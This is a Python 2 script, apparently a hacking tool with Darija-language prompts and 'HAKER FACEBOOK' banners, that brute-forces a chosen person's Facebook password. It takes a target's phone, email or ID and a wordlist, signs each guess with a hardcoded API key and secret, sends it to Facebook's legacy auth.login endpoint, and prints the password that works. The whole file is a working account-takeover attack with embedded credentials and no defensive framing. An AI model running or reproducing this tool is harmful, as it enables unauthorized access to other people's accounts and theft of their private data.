#!/usr/bin/python
import os
os. system('clear')
print("\33[1;32m")
print ("""
              *         *      *         *
          ***          **********          ***
       *****           **********           *****
     *******           **********           *******
   **********         ************         **********
  ****************************************************
 ******************************************************
********************************************************
********************************************************
********************************************************

| __       __   ______   __    __   ______   __       __  ________  ______  __    __
/  \     /  | /      \ /  |  /  | /      \ /  |  _  /  |/        |/      |/  \  /  |
$$  \   /$$ |/$$$$$$  |$$ |  $$ |/$$$$$$  |$$ | / \ $$ |$$$$$$$$/ $$$$$$/ $$  \ $$ |
$$$  \ /$$$ |$$ |  $$/ $$ |__$$ |$$ |__$$ |$$ |/$  \$$ |   $$ |     $$ |  $$$  \$$ |
$$$$  /$$$$ |$$ |      $$    $$ |$$    $$ |$$ /$$$  $$ |   $$ |     $$ |  $$$$  $$ |
$$ $$ $$/$$ |$$ |   __ $$$$$$$$ |$$$$$$$$ |$$ $$/$$ $$ |   $$ |     $$ |  $$ $$ $$ |
$$ |$$$/ $$ |$$ \__/  |$$ |  $$ |$$ |  $$ |$$$$/  $$$$ |   $$ |    _$$ |_ $$ |$$$$ |
$$ | $/  $$ |$$    $$/ $$ |  $$ |$$ |  $$ |$$$/    $$$ |   $$ |   / $$   |$$ | $$$ |                                                          
$$/      $$/  $$$$$$/  $$/   $$/ $$/   $$/ $$/      $$/    $$/    $$$$$$/ $$/   $$/






$ HAKER FACEBOOK

""")
                                         

## fbbrute.py - Facebook Brute Force
# -*- coding: utf-8 -*-
##
import os
import sys
import urllib
import hashlib

API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"
     
__banner__ = """
  ______   __      __  ______   __    __  _______
 /      \ /  \    /  |/      \ /  |  /  |/       \                                      
/$$$$$$  |$$  \  /$$//$$$$$$  |$$ |  $$ |$$$$$$$  |
$$ |__$$ | $$  \/$$/ $$ |  $$ |$$ |  $$ |$$ |__$$ |
$$    $$ |  $$  $$/  $$ |  $$ |$$ |  $$ |$$    $$<                                      
$$$$$$$$ |   $$$$/   $$ |  $$ |$$ |  $$ |$$$$$$$  |
$$ |  $$ |    $$ |   $$ \__$$ |$$ \__$$ |$$ |__$$ |
$$ |  $$ |    $$ |   $$    $$/ $$    $$/ $$    $$/                                      
$$/   $$/     $$/     $$$$$$/   $$$$$$/  $$$$$$$/

                                     
 _______    ______   _______   ______
/       \  /      \ /       \ /       \
$$$$$$$  |/$$$$$$  |$$$$$$$  |$$$$$$$  |
$$ |__$$ |$$ |__$$ |$$ |  $$ |$$ |__$$ |                                                
$$    $$< $$    $$ |$$ |  $$ |$$    $$<
$$$$$$$  |$$$$$$$$ |$$ |  $$ |$$$$$$$  |
$$ |__$$ |$$ |  $$ |$$ |__$$ |$$ |  $$ |                                                
$$    $$/ $$ |  $$ |$$    $$/ $$ |  $$ |
$$$$$$$/  $$/   $$/ $$$$$$$/  $$/   $$/
                                                 
"""
                                                                                                     
print("[+] Facebook Brute Force\n")                                   
userid = raw_input("[*] dakhl da7iya [num|gmail|ID]: ")
try:
	passlist = raw_input("[*] milf dyal wordliat: ")
	if os.path.exists(passlist) != False:
		print(__banner__ )
		print(" [+] tsna : {}".format(userid))
		print(" [+] Ll3dd milf passwordat : {}".format(len(open(passlist,"r").read().split("\n"))))
		print(" [+] Cracking, ....")
		for passwd in open(passlist,'r').readlines():
			sys.stdout.write(u"\u001b[1000D[*] Trying {}".format(passwd.strip()))
			sys.stdout.flush()
			sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}".format(userid,passwd.strip(),API_SECRET)
			xx = hashlib.md5(sig).hexdigest()
			data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}".format(userid,passwd.strip(),xx)
			response = urllib.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read()
			if "error" in response:
				pass
			else:                             
				print("\n\n[+] bsahtk azaml !!")
				print("\n[+] password ===> : {}".format(passwd.strip()))
				break
		print("\n\n[!] thla ...")
	else:
		print("fbbrute: error: No such file or directory")
except KeyboardInterrupt:
	print("fbbrute: error: Keyboard interrupt")
